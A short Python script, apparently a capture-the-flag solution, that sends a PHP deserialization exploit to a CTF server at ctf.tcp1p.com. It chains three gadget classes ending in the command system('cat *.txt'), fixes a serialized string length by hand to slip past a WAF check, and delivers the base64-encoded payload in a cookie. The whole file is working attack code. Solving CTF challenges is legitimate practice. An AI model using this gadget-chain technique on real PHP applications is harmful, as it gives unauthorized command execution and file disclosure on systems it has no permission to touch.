from base64 import b64encode

import requests
from phpserialize import serialize  # this is https://pypi.org/project/libphpserialize/, not the other one
from phpserialize.decorators import namespace

@namespace("GadgetThree")
class Vuln:
	public_waf1 = 1
	protected_waf2 = "\xde\xad\xbe\xef"
	private_waf3 = False
	public_cmd = f"system('cat *.txt');"

@namespace("GadgetOne")
class Adders:
	private_x = Vuln()

@namespace("GadgetTwo")
class Echoers:
	protected_klass = Adders()

exploit = serialize(Echoers())
print(
	requests.get(
	"http://ctf.tcp1p.com:45678/",
	cookies={
	"cookie":
	# do some shenanigans to make waf2 actually be "\xde\xad\xbe\xef"
	b64encode(exploit.encode("latin-1").replace(b"s:8:\"\xde", b"s:4:\"\xde")).decode()
	}
	).text
)
